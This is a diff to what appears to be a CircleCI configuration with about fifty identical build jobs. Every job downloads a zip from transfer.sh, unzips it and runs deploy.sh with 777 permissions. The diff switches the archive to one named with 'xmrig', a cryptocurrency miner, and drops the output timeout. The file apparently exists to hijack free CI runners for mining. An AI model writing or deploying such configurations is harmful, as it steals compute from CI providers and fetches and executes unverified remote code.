@@ -11,8 +11,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build1:
     machine:
       image: ubuntu-2004:202010-01
@@ -24,8 +24,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build2:
     machine:
       image: ubuntu-2004:202010-01
@@ -37,8 +37,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build3:
     machine:
       image: ubuntu-2004:202010-01
@@ -50,8 +50,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build4:
     machine:
       image: ubuntu-2004:202010-01
@@ -63,8 +63,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build5:
     machine:
       image: ubuntu-2004:202010-01
@@ -76,8 +76,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build6:
     machine:
       image: ubuntu-2004:202010-01
@@ -89,8 +89,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build7:
     machine:
       image: ubuntu-2004:202010-01
@@ -102,8 +102,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build8:
     machine:
       image: ubuntu-2004:202010-01
@@ -115,8 +115,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build9:
     machine:
       image: ubuntu-2004:202010-01
@@ -128,8 +128,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build10:
     machine:
       image: ubuntu-2004:202010-01
@@ -141,8 +141,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build11:
     machine:
       image: ubuntu-2004:202010-01
@@ -154,8 +154,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build12:
     machine:
       image: ubuntu-2004:202010-01
@@ -167,8 +167,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build13:
     machine:
       image: ubuntu-2004:202010-01
@@ -180,8 +180,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build14:
     machine:
       image: ubuntu-2004:202010-01
@@ -193,8 +193,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build15:
     machine:
       image: ubuntu-2004:202010-01
@@ -206,8 +206,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build16:
     machine:
       image: ubuntu-2004:202010-01
@@ -219,8 +219,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build17:
     machine:
       image: ubuntu-2004:202010-01
@@ -232,8 +232,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build18:
     machine:
       image: ubuntu-2004:202010-01
@@ -245,8 +245,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build19:
     machine:
       image: ubuntu-2004:202010-01
@@ -258,8 +258,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build20:
     machine:
       image: ubuntu-2004:202010-01
@@ -271,8 +271,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build21:
     machine:
       image: ubuntu-2004:202010-01
@@ -284,8 +284,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build22:
     machine:
       image: ubuntu-2004:202010-01
@@ -297,8 +297,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build23:
     machine:
       image: ubuntu-2004:202010-01
@@ -310,8 +310,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build24:
     machine:
       image: ubuntu-2004:202010-01
@@ -323,8 +323,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build25:
     machine:
       image: ubuntu-2004:202010-01
@@ -336,8 +336,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build26:
     machine:
       image: ubuntu-2004:202010-01
@@ -349,8 +349,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build27:
     machine:
       image: ubuntu-2004:202010-01
@@ -362,8 +362,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build28:
     machine:
       image: ubuntu-2004:202010-01
@@ -375,8 +375,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build29:
     machine:
       image: ubuntu-2004:202010-01
@@ -388,8 +388,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build30:
     machine:
       image: ubuntu-2004:202010-01
@@ -401,8 +401,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build31:
     machine:
       image: ubuntu-2004:202010-01
@@ -414,8 +414,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build32:
     machine:
       image: ubuntu-2004:202010-01
@@ -427,8 +427,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build33:
     machine:
       image: ubuntu-2004:202010-01
@@ -440,8 +440,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build34:
     machine:
       image: ubuntu-2004:202010-01
@@ -453,8 +453,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build35:
     machine:
       image: ubuntu-2004:202010-01
@@ -466,8 +466,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build36:
     machine:
       image: ubuntu-2004:202010-01
@@ -479,8 +479,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build37:
     machine:
       image: ubuntu-2004:202010-01
@@ -492,8 +492,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build38:
     machine:
       image: ubuntu-2004:202010-01
@@ -505,8 +505,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build39:
     machine:
       image: ubuntu-2004:202010-01
@@ -518,8 +518,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build40:
     machine:
       image: ubuntu-2004:202010-01
@@ -531,8 +531,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build41:
     machine:
       image: ubuntu-2004:202010-01
@@ -544,8 +544,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build42:
     machine:
       image: ubuntu-2004:202010-01
@@ -557,8 +557,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build43:
     machine:
       image: ubuntu-2004:202010-01
@@ -570,8 +570,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build44:
     machine:
       image: ubuntu-2004:202010-01
@@ -583,8 +583,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build45:
     machine:
       image: ubuntu-2004:202010-01
@@ -596,8 +596,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build46:
     machine:
       image: ubuntu-2004:202010-01
@@ -609,8 +609,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build47:
     machine:
       image: ubuntu-2004:202010-01
@@ -622,8 +622,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build48:
     machine:
       image: ubuntu-2004:202010-01
@@ -635,8 +635,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build49:
     machine:
       image: ubuntu-2004:202010-01
@@ -648,8 +648,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   build50:
     machine:
       image: ubuntu-2004:202010-01
@@ -661,8 +661,8 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
-        no_output_timeout: 235m
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        
   
 
 workflows:
